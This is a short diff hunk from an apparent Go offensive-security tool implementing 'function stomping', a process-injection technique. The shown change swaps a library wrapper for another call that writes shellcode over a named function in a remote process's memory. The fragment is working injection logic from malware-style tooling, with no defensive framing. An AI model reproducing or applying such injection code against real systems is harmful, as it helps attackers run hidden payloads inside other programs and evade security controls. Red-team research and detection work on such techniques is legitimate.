@@ -103,7 +103,7 @@ func FuncGoFunctionStomping(pid uint32, functionName, dllName string, shellcode 
 		fmt.Println("[*] Successful to change protection !")
 	}
 
-	err := w32.WriteProcessMemory(pHandle, procAddress, shellcode, uint(len(shellcode)))
+	err := winApi.ProcWriteProcessMemory(pHandle, procAddress, shellcode, uint(len(shellcode)))
 	if err != nil {
 		fmt.Println("[!] Fail to overwrite function !")
 	} else {
